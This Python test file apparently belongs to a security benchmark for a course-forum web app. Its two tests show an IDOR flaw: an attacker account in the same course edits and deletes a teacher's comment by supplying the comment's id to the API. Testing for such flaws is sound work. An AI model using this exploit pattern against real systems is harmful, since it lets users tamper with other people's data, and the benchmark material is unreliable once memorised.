import requests


def api_url(base_url: str, path: str) -> str:
    return base_url.rstrip("/") + path


def json_of(resp):
    try:
        return resp.json()
    except Exception as exc:
        raise AssertionError(
            f"Expected JSON response, got status={resp.status_code}, body={resp.text}"
        ) from exc


def register(session: requests.Session, base_url: str, username: str, password: str, display_name: str):
    return session.post(
        api_url(base_url, "/api/auth/register"),
        json={
            "username": username,
            "password": password,
            "display_name": display_name,
        },
        timeout=10,
    )


def create_course(session: requests.Session, base_url: str, title: str, description: str):
    return session.post(
        api_url(base_url, "/api/courses"),
        json={"title": title, "description": description},
        timeout=10,
    )


def add_member(session: requests.Session, base_url: str, course_id: int, user_id: int, role_in_course: str):
    return session.post(
        api_url(base_url, f"/api/courses/{course_id}/members"),
        json={
            "user_id": user_id,
            "role_in_course": role_in_course,
        },
        timeout=10,
    )


def create_post(session: requests.Session, base_url: str, course_id: int, title: str, body: str):
    return session.post(
        api_url(base_url, f"/api/courses/{course_id}/posts"),
        json={"title": title, "body": body},
        timeout=10,
    )


def create_comment(session: requests.Session, base_url: str, course_id: int, post_id: int, body: str):
    return session.post(
        api_url(base_url, f"/api/courses/{course_id}/posts/{post_id}/comments"),
        json={"body": body},
        timeout=10,
    )


def get_post(session: requests.Session, base_url: str, course_id: int, post_id: int):
    return session.get(
        api_url(base_url, f"/api/courses/{course_id}/posts/{post_id}"),
        timeout=10,
    )


def list_users(session: requests.Session, base_url: str):
    return session.get(api_url(base_url, "/api/users"), timeout=10)


def find_user_id_by_username(session: requests.Session, base_url: str, username: str):
    resp = list_users(session, base_url)
    assert resp.status_code == 200, resp.text
    payload = json_of(resp)
    assert payload["success"] is True
    for user in payload["users"]:
        if user["username"] == username:
            return int(user["user_id"])
    return None


def find_comment_by_id_in_post_payload(payload, comment_id: int):
    for comment in payload.get("comments", []):
        if int(comment["comment_id"]) == int(comment_id):
            return comment
    return None


def test_exploit_vuln_002_course_member_can_update_another_users_comment_via_api(app_instance):
    """
    Exploit expectation:
    Any authenticated member in the same course can update another member's comment
    by supplying that comment_id.
    """
    base_url = app_instance["base_url"]

    teacher = requests.Session()
    attacker = requests.Session()

    r = register(teacher, base_url, "comment_teacher", "pass123", "Comment Teacher")
    assert r.status_code == 201, r.text

    r = register(attacker, base_url, "comment_attacker", "pass123", "Comment Attacker")
    assert r.status_code == 201, r.text

    create_course_resp = create_course(teacher, base_url, "Comment IDOR Course", "demo")
    assert create_course_resp.status_code == 201, create_course_resp.text
    course_id = int(json_of(create_course_resp)["course"]["course_id"])

    attacker_user_id = find_user_id_by_username(teacher, base_url, "comment_attacker")
    assert attacker_user_id is not None

    add_resp = add_member(teacher, base_url, course_id, attacker_user_id, "student")
    assert add_resp.status_code == 201, add_resp.text

    create_post_resp = create_post(
        teacher,
        base_url,
        course_id,
        "Shared Post",
        "post body",
    )
    assert create_post_resp.status_code == 201, create_post_resp.text
    post_id = int(json_of(create_post_resp)["post"]["post_id"])

    create_comment_resp = create_comment(
        teacher,
        base_url,
        course_id,
        post_id,
        "teacher original comment",
    )
    assert create_comment_resp.status_code == 201, create_comment_resp.text
    comment_id = int(json_of(create_comment_resp)["comment"]["comment_id"])

    forged = attacker.put(
        api_url(base_url, f"/api/courses/{course_id}/posts/{post_id}/comments/{comment_id}"),
        json={"body": "attacker changed another user's comment"},
        timeout=10,
    )
    assert forged.status_code == 200, forged.text
    forged_payload = json_of(forged)
    assert forged_payload["success"] is True
    assert forged_payload["comment"]["body"] == "attacker changed another user's comment"

    verify = get_post(teacher, base_url, course_id, post_id)
    assert verify.status_code == 200, verify.text
    verify_payload = json_of(verify)
    changed = find_comment_by_id_in_post_payload(verify_payload, comment_id)
    assert changed is not None
    assert changed["body"] == "attacker changed another user's comment"


def test_exploit_vuln_002_course_member_can_delete_another_users_comment_via_api(app_instance):
    """
    Exploit expectation:
    Any authenticated member in the same course can delete another member's comment
    by supplying that comment_id.
    """
    base_url = app_instance["base_url"]

    teacher = requests.Session()
    attacker = requests.Session()

    r = register(teacher, base_url, "comment_teacher_del", "pass123", "Comment Teacher Del")
    assert r.status_code == 201, r.text

    r = register(attacker, base_url, "comment_attacker_del", "pass123", "Comment Attacker Del")
    assert r.status_code == 201, r.text

    create_course_resp = create_course(teacher, base_url, "Comment IDOR Delete Course", "demo")
    assert create_course_resp.status_code == 201, create_course_resp.text
    course_id = int(json_of(create_course_resp)["course"]["course_id"])

    attacker_user_id = find_user_id_by_username(teacher, base_url, "comment_attacker_del")
    assert attacker_user_id is not None

    add_resp = add_member(teacher, base_url, course_id, attacker_user_id, "student")
    assert add_resp.status_code == 201, add_resp.text

    create_post_resp = create_post(
        teacher,
        base_url,
        course_id,
        "Shared Post Delete",
        "post body",
    )
    assert create_post_resp.status_code == 201, create_post_resp.text
    post_id = int(json_of(create_post_resp)["post"]["post_id"])

    create_comment_resp = create_comment(
        teacher,
        base_url,
        course_id,
        post_id,
        "teacher comment to delete",
    )
    assert create_comment_resp.status_code == 201, create_comment_resp.text
    comment_id = int(json_of(create_comment_resp)["comment"]["comment_id"])

    forged = attacker.delete(
        api_url(base_url, f"/api/courses/{course_id}/posts/{post_id}/comments/{comment_id}"),
        timeout=10,
    )
    assert forged.status_code == 200, forged.text
    forged_payload = json_of(forged)
    assert forged_payload["success"] is True

    verify = get_post(teacher, base_url, course_id, post_id)
    assert verify.status_code == 200, verify.text
    verify_payload = json_of(verify)
    deleted = find_comment_by_id_in_post_payload(verify_payload, comment_id)
    assert deleted is None